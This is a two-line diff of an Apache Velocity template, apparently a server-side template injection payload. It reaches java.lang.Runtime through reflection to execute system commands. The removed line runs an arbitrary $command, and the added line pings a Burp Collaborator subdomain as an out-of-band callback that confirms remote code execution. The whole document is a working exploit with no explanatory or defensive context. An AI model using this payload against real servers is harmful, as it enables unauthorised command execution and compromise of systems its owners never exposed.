@@ -1,2 +1,2 @@
 #set ($exp="test")
-#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
+#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(ping 7y6depaep6r4rj1ioaglfyblgcm2ar.burpcollaborator.net))
